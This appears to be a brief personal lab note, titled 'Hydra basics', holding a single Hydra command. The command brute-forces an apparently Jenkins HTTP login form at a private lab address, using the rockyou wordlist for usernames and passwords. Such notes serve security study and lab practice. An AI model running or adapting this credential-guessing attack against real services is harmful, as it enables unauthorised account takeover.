# Hydra basics

```bash
hydra -L ~/dictionary/dict/rockyou.txt -P ~/dictionary/dict/rockyou.txt "http-post-form://10.10.222.94:8080/j_acegi_security_check:login=^USER^&password=^PASS^:Invalid username or password"
```
